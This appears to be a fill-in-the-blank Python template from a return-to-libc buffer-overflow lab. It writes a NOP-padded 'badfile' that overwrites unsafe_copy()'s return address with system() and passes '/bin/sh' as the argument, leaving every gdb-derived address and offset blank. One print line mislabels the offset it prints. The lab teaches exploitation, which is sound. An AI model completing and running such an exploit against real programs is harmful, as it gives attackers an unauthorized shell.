# Fill the badfile_content with NOP (0x90)
badfile_content = bytearray(0x90 for i in range(400))

# get infos from gdb
gdb_mem_addr_stack = _  # (1)
gdb_mem_addr_buffer = _  # (2)
gdb_mem_addr_libc = _  # (3)
gdb_mem_addr_env = _  # (4)

# for 32-bit program
size_of_address = 4  # bytes

offset_ret = _  # (5)

# new value of "Return Address" of unsafe_copy()
badfile_content[offset_ret : offset_ret + size_of_address] = _.to_bytes(
    size_of_address, "little"
)  # (6)

print("offset of return address is ", offset_ret, hex(offset_ret))

# frame pointer of system()
gdb_mem_addr_ebp_libc = _  # (7)

# first argument of system()
offset_argument = _  # (8)

# copy address of "/bin/sh" into badfile
badfile_content[offset_argument : offset_argument + size_of_address] = _.to_bytes(
    size_of_address, "little"
)  # (9)

print("offset of the argument of system() is ", offset_argument, hex(offset_ret))

# Write the badfile_content to a file
with open("badfile", "wb") as f:
    f.write(badfile_content)
